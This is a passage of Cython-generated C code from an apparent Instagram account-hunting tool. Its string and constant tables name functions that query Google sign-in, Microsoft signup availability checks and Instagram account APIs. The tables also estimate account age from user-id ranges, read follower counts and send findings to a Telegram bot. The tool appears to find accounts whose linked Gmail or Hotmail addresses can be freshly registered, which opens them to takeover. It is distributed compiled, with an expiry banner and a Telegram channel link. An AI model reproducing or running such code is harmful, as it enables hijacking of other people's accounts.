  {&__pyx_n_s_space, __pyx_k_space, sizeof(__pyx_k_space), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_splitlines, __pyx_k_splitlines, sizeof(__pyx_k_splitlines), 0, 0, 1, 1},
  {&__pyx_n_s_ss66, __pyx_k_ss66, sizeof(__pyx_k_ss66), 0, 0, 1, 1},
  {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
  {&__pyx_n_s_status_code, __pyx_k_status_code, sizeof(__pyx_k_status_code), 0, 0, 1, 1},
  {&__pyx_n_s_stdout, __pyx_k_stdout, sizeof(__pyx_k_stdout), 0, 0, 1, 1},
  {&__pyx_n_s_string, __pyx_k_string, sizeof(__pyx_k_string), 0, 0, 1, 1},
  {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_target, __pyx_k_target, sizeof(__pyx_k_target), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
  {&__pyx_kp_u_text_2, __pyx_k_text_2, sizeof(__pyx_k_text_2), 0, 1, 0, 0},
  {&__pyx_kp_u_text_This_User_Use_Your_Gmail_m, __pyx_k_text_This_User_Use_Your_Gmail_m, sizeof(__pyx_k_text_This_User_Use_Your_Gmail_m), 0, 1, 0, 0},
  {&__pyx_n_s_threading, __pyx_k_threading, sizeof(__pyx_k_threading), 0, 0, 1, 1},
  {&__pyx_n_u_threading, __pyx_k_threading, sizeof(__pyx_k_threading), 0, 1, 0, 1},
  {&__pyx_n_s_throw, __pyx_k_throw, sizeof(__pyx_k_throw), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_tl, __pyx_k_tl, sizeof(__pyx_k_tl), 0, 0, 1, 1},
  {&__pyx_kp_u_tl_txt, __pyx_k_tl_txt, sizeof(__pyx_k_tl_txt), 0, 1, 0, 0},
  {&__pyx_n_s_tlg, __pyx_k_tlg, sizeof(__pyx_k_tlg), 0, 0, 1, 1},
  {&__pyx_n_s_tll, __pyx_k_tll, sizeof(__pyx_k_tll), 0, 0, 1, 1},
  {&__pyx_n_s_tll_locals_genexpr, __pyx_k_tll_locals_genexpr, sizeof(__pyx_k_tll_locals_genexpr), 0, 0, 1, 1},
  {&__pyx_n_s_today, __pyx_k_today, sizeof(__pyx_k_today), 0, 0, 1, 1},
  {&__pyx_n_s_tok, __pyx_k_tok, sizeof(__pyx_k_tok), 0, 0, 1, 1},
  {&__pyx_n_s_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 0, 1, 1},
  {&__pyx_n_u_treatments, __pyx_k_treatments, sizeof(__pyx_k_treatments), 0, 1, 0, 1},
  {&__pyx_kp_u_txt, __pyx_k_txt, sizeof(__pyx_k_txt), 0, 1, 0, 0},
  {&__pyx_kp_u_u_1_i, __pyx_k_u_1_i, sizeof(__pyx_k_u_1_i), 0, 1, 0, 0},
  {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
  {&__pyx_n_u_unicode_escape, __pyx_k_unicode_escape, sizeof(__pyx_k_unicode_escape), 0, 1, 0, 1},
  {&__pyx_n_s_upper, __pyx_k_upper, sizeof(__pyx_k_upper), 0, 0, 1, 1},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
  {&__pyx_n_u_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 1, 0, 1},
  {&__pyx_kp_u_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 1, 0, 0},
  {&__pyx_n_s_user_agent_2, __pyx_k_user_agent_2, sizeof(__pyx_k_user_agent_2), 0, 0, 1, 1},
  {&__pyx_n_u_user_agent_2, __pyx_k_user_agent_2, sizeof(__pyx_k_user_agent_2), 0, 1, 0, 1},
  {&__pyx_n_s_user_id, __pyx_k_user_id, sizeof(__pyx_k_user_id), 0, 0, 1, 1},
  {&__pyx_n_s_user_info, __pyx_k_user_info, sizeof(__pyx_k_user_info), 0, 0, 1, 1},
  {&__pyx_n_s_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 0, 1, 1},
  {&__pyx_n_u_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 1, 0, 1},
  {&__pyx_n_s_uui, __pyx_k_uui, sizeof(__pyx_k_uui), 0, 0, 1, 1},
  {&__pyx_n_s_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 0, 1, 1},
  {&__pyx_n_u_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 1, 0, 1},
  {&__pyx_n_s_uuid4, __pyx_k_uuid4, sizeof(__pyx_k_uuid4), 0, 0, 1, 1},
  {&__pyx_n_u_variables, __pyx_k_variables, sizeof(__pyx_k_variables), 0, 1, 0, 1},
  {&__pyx_n_u_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 1, 0, 1},
  {&__pyx_n_s_webbrowser, __pyx_k_webbrowser, sizeof(__pyx_k_webbrowser), 0, 0, 1, 1},
  {&__pyx_n_u_webbrowser, __pyx_k_webbrowser, sizeof(__pyx_k_webbrowser), 0, 1, 0, 1},
  {&__pyx_n_s_white, __pyx_k_white, sizeof(__pyx_k_white), 0, 0, 1, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_n_s_year, __pyx_k_year, sizeof(__pyx_k_year), 0, 0, 1, 1},
  {&__pyx_n_s_yellow, __pyx_k_yellow, sizeof(__pyx_k_yellow), 0, 0, 1, 1},
  {&__pyx_n_u_yellow, __pyx_k_yellow, sizeof(__pyx_k_yellow), 0, 1, 0, 1},
  {&__pyx_n_s_yy, __pyx_k_yy, sizeof(__pyx_k_yy), 0, 0, 1, 1},
  {&__pyx_n_s_z, __pyx_k_z, sizeof(__pyx_k_z), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 39, __pyx_L1_error)
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 43, __pyx_L1_error)
  __pyx_builtin_ImportError = __Pyx_GetBuiltinName(__pyx_n_s_ImportError); if (!__pyx_builtin_ImportError) __PYX_ERR(0, 69, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 246, __pyx_L1_error)
  __pyx_builtin_BaseException = __Pyx_GetBuiltinName(__pyx_n_s_BaseException); if (!__pyx_builtin_BaseException) __PYX_ERR(0, 386, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 740, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 445, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple__10 = PyTuple_Pack(1, __pyx_kp_u_Error_Could_not_retrieve_bot_inf); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);

  
  __pyx_tuple__12 = PyTuple_Pack(2, __pyx_n_u_first_name, __pyx_kp_u_No_first_name_available); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__12);
  __Pyx_GIVEREF(__pyx_tuple__12);

  
  __pyx_tuple__13 = PyTuple_Pack(2, __pyx_n_u_username, Py_None); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 230, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);

  
  __pyx_tuple__15 = PyTuple_Pack(1, __pyx_kp_u_User_does_not_have_a_username_Do); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 237, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  
  __pyx_tuple__16 = PyTuple_Pack(1, __pyx_kp_u_Error_Could_not_retrieve_user_in); if (unlikely(!__pyx_tuple__16)) __PYX_ERR(0, 239, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__16);
  __Pyx_GIVEREF(__pyx_tuple__16);

  
  __pyx_tuple__18 = PyTuple_Pack(2, __pyx_int_6, __pyx_int_9); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  
  __pyx_tuple__19 = PyTuple_Pack(2, __pyx_int_3, __pyx_int_9); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 405, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__19);
  __Pyx_GIVEREF(__pyx_tuple__19);

  
  __pyx_tuple__20 = PyTuple_Pack(2, __pyx_int_15, __pyx_int_30); if (unlikely(!__pyx_tuple__20)) __PYX_ERR(0, 406, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__20);
  __Pyx_GIVEREF(__pyx_tuple__20);

  
  __pyx_tuple__23 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com_signin); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 414, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__23);
  __Pyx_GIVEREF(__pyx_tuple__23);

  
  __pyx_tuple__26 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com___sign); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 437, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  
  __pyx_tuple__28 = PyTuple_Pack(2, __pyx_kp_u_tl_txt, __pyx_n_u_w); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 445, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);
  __pyx_tuple__30 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 445, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);

  
  __pyx_tuple__32 = PyTuple_Pack(2, __pyx_kp_u_tl_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 462, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__32);
  __Pyx_GIVEREF(__pyx_tuple__32);

  
  __pyx_tuple__33 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com___sign_2); if (unlikely(!__pyx_tuple__33)) __PYX_ERR(0, 487, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__33);
  __Pyx_GIVEREF(__pyx_tuple__33);

  
  __pyx_tuple__34 = PyTuple_Pack(1, __pyx_kp_u_https_signup_live_com_API_CheckA); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 528, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);

  
  __pyx_slice__35 = PySlice_New(Py_None, __pyx_int_16, Py_None); if (unlikely(!__pyx_slice__35)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__35);
  __Pyx_GIVEREF(__pyx_slice__35);

  
  __pyx_tuple__36 = PyTuple_Pack(1, __pyx_kp_u_https_i_instagram_com_api_v1_acc); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 566, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);

  
  __pyx_tuple__38 = PyTuple_Pack(2, __pyx_int_1279000, __pyx_int_2010); if (unlikely(!__pyx_tuple__38)) __PYX_ERR(0, 623, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__38);
  __Pyx_GIVEREF(__pyx_tuple__38);

  
  __pyx_tuple__39 = PyTuple_Pack(2, __pyx_int_17750000, __pyx_int_2011); if (unlikely(!__pyx_tuple__39)) __PYX_ERR(0, 624, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__39);
  __Pyx_GIVEREF(__pyx_tuple__39);

  
  __pyx_tuple__40 = PyTuple_Pack(2, __pyx_int_279760000, __pyx_int_2012); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 625, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);

  
  __pyx_tuple__41 = PyTuple_Pack(2, __pyx_int_900990000, __pyx_int_2013); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 626, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);

  
  __pyx_tuple__42 = PyTuple_Pack(2, __pyx_int_1629010000, __pyx_int_2014); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 627, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);

  
  __pyx_tuple__43 = PyTuple_Pack(2, __pyx_int_2500000000, __pyx_int_2015); if (unlikely(!__pyx_tuple__43)) __PYX_ERR(0, 628, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__43);
  __Pyx_GIVEREF(__pyx_tuple__43);

  
  __pyx_tuple__44 = PyTuple_Pack(2, __pyx_int_3713668786, __pyx_int_2016); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 629, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);

  
  __pyx_tuple__45 = PyTuple_Pack(2, __pyx_int_5699785217, __pyx_int_2017); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 630, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__45);
  __Pyx_GIVEREF(__pyx_tuple__45);

  
  __pyx_tuple__46 = PyTuple_Pack(2, __pyx_int_8597939245, __pyx_int_2018); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 631, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);

  
  __pyx_tuple__47 = PyTuple_Pack(2, __pyx_int_21254029834, __pyx_int_2019); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 632, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__47);
  __Pyx_GIVEREF(__pyx_tuple__47);

  
  __pyx_tuple__48 = PyTuple_Pack(2, __pyx_n_u_pk, __pyx_n_u_none); if (unlikely(!__pyx_tuple__48)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__48);
  __Pyx_GIVEREF(__pyx_tuple__48);

  
  __pyx_tuple__49 = PyTuple_Pack(2, __pyx_n_u_follower_count, __pyx_n_u_none); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 669, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__49);
  __Pyx_GIVEREF(__pyx_tuple__49);

  
  __pyx_tuple__50 = PyTuple_Pack(2, __pyx_n_u_following_count, __pyx_n_u_none); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__50);
  __Pyx_GIVEREF(__pyx_tuple__50);

  
  __pyx_tuple__51 = PyTuple_Pack(2, __pyx_n_u_media_count, __pyx_n_u_none); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 671, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__51);
  __Pyx_GIVEREF(__pyx_tuple__51);

  
  __pyx_tuple__53 = PyTuple_Pack(2, __pyx_kp_u_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 696, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);

  
  __pyx_tuple__54 = PyTuple_Pack(2, __pyx_int_5699785217, __pyx_int_8597939245); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 720, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__54);
  __Pyx_GIVEREF(__pyx_tuple__54);

  
  __pyx_tuple__55 = PyTuple_Pack(1, __pyx_kp_u_https_www_instagram_com_api_grap); if (unlikely(!__pyx_tuple__55)) __PYX_ERR(0, 726, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__55);
  __Pyx_GIVEREF(__pyx_tuple__55);

  
  __pyx_tuple__65 = PyTuple_Pack(5, __pyx_int_2025, __pyx_int_4, __pyx_int_4, __pyx_int_0, __pyx_int_0); if (unlikely(!__pyx_tuple__65)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__65);
  __Pyx_GIVEREF(__pyx_tuple__65);

  
  __pyx_tuple__66 = PyTuple_Pack(1, __pyx_kp_u_1_32m_THIS_FILE_IS_EXPIRED_Chec); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__66);
  __Pyx_GIVEREF(__pyx_tuple__66);

  
  __pyx_tuple__67 = PyTuple_Pack(1, __pyx_int_1); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__67);
  __Pyx_GIVEREF(__pyx_tuple__67);

  
  __pyx_tuple__68 = PyTuple_Pack(1, __pyx_kp_u_https_t_me_Python_Tools7); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__68);
  __Pyx_GIVEREF(__pyx_tuple__68);

  
  __pyx_tuple__85 = PyTuple_Pack(1, __pyx_n_u_clear); if (unlikely(!__pyx_tuple__85)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__85);
  __Pyx_GIVEREF(__pyx_tuple__85);

  
  __pyx_tuple__86 = PyTuple_Pack(1, __pyx_n_u_eizon); if (unlikely(!__pyx_tuple__86)) __PYX_ERR(0, 78, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__86);
  __Pyx_GIVEREF(__pyx_tuple__86);

  
  __pyx_tuple__88 = PyTuple_Pack(2, __pyx_int_100, __pyx_int_300); if (unlikely(!__pyx_tuple__88)) __PYX_ERR(0, 119, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__88);
  __Pyx_GIVEREF(__pyx_tuple__88);

  
  __pyx_tuple__89 = PyTuple_Pack(3, __pyx_n_s_self, __pyx_n_s_z, __pyx_n_s_e); if (unlikely(!__pyx_tuple__89)) __PYX_ERR(0, 127, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__89);
  __Pyx_GIVEREF(__pyx_tuple__89);
  __pyx_codeobj__90 = (PyObject*)__Pyx_PyCode_New(2, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__89, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_init, 127, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__90)) __PYX_ERR(0, 127, __pyx_L1_error)

  
  __pyx_codeobj__91 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_clear, 163, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__91)) __PYX_ERR(0, 163, __pyx_L1_error)

  
  __pyx_codeobj__92 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_i, 167, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__92)) __PYX_ERR(0, 167, __pyx_L1_error)

  
  __pyx_tuple__95 = PyTuple_Pack(3, __pyx_n_s_loading_chars, __pyx_n_s__94, __pyx_n_s_char); if (unlikely(!__pyx_tuple__95)) __PYX_ERR(0, 183, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__95);
  __Pyx_GIVEREF(__pyx_tuple__95);
  __pyx_codeobj__96 = (PyObject*)__Pyx_PyCode_New(0, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__95, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_loading_animation, 183, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__96)) __PYX_ERR(0, 183, __pyx_L1_error)

  
  __pyx_tuple__97 = PyTuple_Pack(6, __pyx_n_s_token, __pyx_n_s_url, __pyx_n_s_response, __pyx_n_s_data, __pyx_n_s_first_name, __pyx_n_s_username); if (unlikely(!__pyx_tuple__97)) __PYX_ERR(0, 196, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__97);
  __Pyx_GIVEREF(__pyx_tuple__97);
  __pyx_codeobj__98 = (PyObject*)__Pyx_PyCode_New(1, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__97, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_bot_info, 196, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__98)) __PYX_ERR(0, 196, __pyx_L1_error)

  
  __pyx_tuple__99 = PyTuple_Pack(9, __pyx_n_s_token, __pyx_n_s_user_id, __pyx_n_s_url, __pyx_n_s_params, __pyx_n_s_response, __pyx_n_s_data, __pyx_n_s_user_info, __pyx_n_s_first_name, __pyx_n_s_username); if (unlikely(!__pyx_tuple__99)) __PYX_ERR(0, 218, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__99);
  __Pyx_GIVEREF(__pyx_tuple__99);
  __pyx_codeobj__100 = (PyObject*)__Pyx_PyCode_New(2, 0, 9, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__99, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_user_info, 218, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__100)) __PYX_ERR(0, 218, __pyx_L1_error)

  
  __pyx_tuple__101 = PyTuple_Pack(1, __pyx_kp_u_0_91m_0_93m_0_92m_1_97m_1_41m_0); if (unlikely(!__pyx_tuple__101)) __PYX_ERR(0, 246, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__101);
  __Pyx_GIVEREF(__pyx_tuple__101);

  
  __pyx_tuple__102 = PyTuple_Pack(1, __pyx_kp_u_s_4); if (unlikely(!__pyx_tuple__102)) __PYX_ERR(0, 249, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__102);
  __Pyx_GIVEREF(__pyx_tuple__102);

  
  __pyx_tuple__103 = PyTuple_Pack(1, __pyx_kp_u_0_91m_0_93m_0_92m_1_97m_1_41m_0_2); if (unlikely(!__pyx_tuple__103)) __PYX_ERR(0, 254, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__103);
  __Pyx_GIVEREF(__pyx_tuple__103);

  
  __pyx_tuple__104 = PyTuple_Pack(1, __pyx_kp_u_s_s_3); if (unlikely(!__pyx_tuple__104)) __PYX_ERR(0, 257, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__104);
  __Pyx_GIVEREF(__pyx_tuple__104);

  
  __pyx_tuple__105 = PyTuple_Pack(1, __pyx_int_2); if (unlikely(!__pyx_tuple__105)) __PYX_ERR(0, 261, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__105);
  __Pyx_GIVEREF(__pyx_tuple__105);

  
  __pyx_tuple__107 = PyTuple_Pack(1, __pyx_kp_u_https_signup_live_com_API_Evalua); if (unlikely(!__pyx_tuple__107)) __PYX_ERR(0, 378, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__107);
  __Pyx_GIVEREF(__pyx_tuple__107);

  
  __pyx_tuple__108 = PyTuple_Pack(17, __pyx_n_s_n1, __pyx_n_s_n2, __pyx_n_s_host, __pyx_n_s_he3, __pyx_n_s_res1, __pyx_n_s_tok, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_tl, __pyx_n_s_f, __pyx_n_s_e, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__108)) __PYX_ERR(0, 402, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__108);
  __Pyx_GIVEREF(__pyx_tuple__108);
  __pyx_codeobj__109 = (PyObject*)__Pyx_PyCode_New(0, 0, 17, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__108, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_tll, 402, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__109)) __PYX_ERR(0, 402, __pyx_L1_error)

  
  __pyx_tuple__110 = PyTuple_Pack(12, __pyx_n_s_email, __pyx_n_s_o, __pyx_n_s_tl, __pyx_n_s_host, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_params, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_ok, __pyx_n_s_username, __pyx_n_s_gg); if (unlikely(!__pyx_tuple__110)) __PYX_ERR(0, 455, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__110);
  __Pyx_GIVEREF(__pyx_tuple__110);
  __pyx_codeobj__111 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__110, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check_gmail, 455, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__111)) __PYX_ERR(0, 455, __pyx_L1_error)

  
  __pyx_tuple__112 = PyTuple_Pack(7, __pyx_n_s_email, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_json_data, __pyx_n_s_response, __pyx_n_s_username, __pyx_n_s_gg); if (unlikely(!__pyx_tuple__112)) __PYX_ERR(0, 511, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__112);
  __Pyx_GIVEREF(__pyx_tuple__112);
  __pyx_codeobj__113 = (PyObject*)__Pyx_PyCode_New(1, 0, 7, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__112, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_hotmail, 511, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__113)) __PYX_ERR(0, 511, __pyx_L1_error)

  
  __pyx_tuple__114 = PyTuple_Pack(8, __pyx_n_s_email, __pyx_n_s_ua, __pyx_n_s_dev, __pyx_n_s_device_id, __pyx_n_s_uui, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response); if (unlikely(!__pyx_tuple__114)) __PYX_ERR(0, 545, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__114);
  __Pyx_GIVEREF(__pyx_tuple__114);
  __pyx_codeobj__115 = (PyObject*)__Pyx_PyCode_New(1, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__114, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check, 545, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__115)) __PYX_ERR(0, 545, __pyx_L1_error)

  
